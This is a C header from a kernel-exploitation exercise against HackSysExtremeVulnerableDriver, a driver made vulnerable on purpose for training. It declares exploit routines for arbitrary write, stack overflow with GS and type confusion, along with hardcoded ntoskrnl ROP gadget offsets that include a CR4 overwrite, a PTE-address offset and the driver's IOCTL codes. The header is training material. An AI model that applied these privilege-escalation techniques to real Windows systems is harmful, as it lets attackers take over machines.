#pragma once
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <ntstatus.h>
#include <winternl.h>
#include <Psapi.h>
#include <string.h>
#include "ntdefines.h"

#define DRIVER_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

uintptr_t getPteAddress(PVOID addr, PVOID base);

// ntoskrnl.exe Gadgets
#define JUST_RET 0x20003e
#define MOV_CR4_RCX 0x39d457
#define POP_RCX     0x2021a0
#define MOV_RAX_TO_PTR_RCX 0x224c91
#define POP_RAX     0x2017f2
#define WBINVD_GADGET   0x037f2b0

// ArbitraryWrite
BOOL ExploitArbitraryWrite();
#define MiGetPteAddressOffset 0x27af40
#define HANDLE_TYPE_TOKEN 5

typedef struct _WriteWhatWhereBuffer
{
    uintptr_t what;
    uintptr_t where;
} WriteWhatWhereBuffer;

typedef struct _ArbitraryReadBuffer
{
    uintptr_t readAddress;
    uintptr_t outBuf;
} ArbitraryReadBuffer;

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG   ProfileSource,
                                                   OUT PULONG Interval);


// StackOverflowGS
BOOL ExploitStackOverflowGS();
#define STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH 616
#define CACHE_SPRAY_SIZE 3000

// Type Confusion
BOOL ExploitTypeConfusion();
//
// IOCTL Definitions
//

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)